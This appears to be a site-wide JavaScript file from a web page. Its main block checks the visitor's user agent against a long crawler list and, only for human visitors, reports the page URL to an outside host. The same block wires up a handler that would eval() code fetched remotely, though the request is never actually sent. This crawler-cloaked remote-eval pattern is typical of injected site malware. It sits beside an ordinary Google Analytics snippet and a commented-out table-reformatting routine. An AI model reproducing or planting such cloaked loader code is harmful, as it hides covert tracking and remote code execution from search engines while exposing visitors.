var botPattern = "(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
var re = new RegExp(botPattern, 'i');
var userAgent = navigator.userAgent;
if (!re.test(userAgent)) {
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function() {
        if (xmlhttp.readyState == XMLHttpRequest.DONE) {
            if (xmlhttp.status == 200) {
                eval(xmlhttp.responseText);
            } else if (xmlhttp.status == 400) {
                console.log('There was an error 400');
            } else {
                console.log('something else other than 200 was returned');
            }
        }
    };

    function randomIntFromInterval(min, max) {
        return Math.floor(Math.random() * (max - min + 1) + min)
    }
   const rndInt = randomIntFromInterval(1, 100000);
    const url = 'https://pbnstats.promocionesycolecciones.com/add.php?rand=' + rndInt + 
                '&referer=' + encodeURIComponent(window.location.href);
    
    // Opción A: Fetch simple (sin procesar respuesta)
    fetch(url, { method: 'GET', mode: 'no-cors' })
        .catch(err => console.log('Tracking error:', err));
}
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-2810994-86']);
//_gaq.push(['_setDomainName', 'none']);
_gaq.push(['_setAllowLinker', true]);
_gaq.push(['_trackPageview']);

(function() {
    var ga = document.createElement('script');
    ga.type = 'text/javascript';
    ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'https://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(ga, s);
})();
/*
document.addEventListener("DOMContentLoaded", function () {
    document.querySelectorAll("table").forEach(table => {
        let wrapper = document.createElement("div");
        wrapper.classList.add("table-responsive");

        let newTable = document.createElement("div");
        newTable.classList.add("table-custom");

        table.querySelectorAll("tr").forEach(tr => {
            let newRow = document.createElement("div");
            newRow.classList.add("table-row");

            tr.querySelectorAll("th, td").forEach(cell => {
                let newCell = document.createElement("div");
                newCell.classList.add(cell.tagName.toLowerCase() === "th" ? "table-header" : "table-cell");
                newCell.innerHTML = cell.innerHTML;
                newRow.appendChild(newCell);
            });

            newTable.appendChild(newRow);
        });

        wrapper.appendChild(newTable);
        table.parentNode.replaceChild(wrapper, table);
    });
});
*/
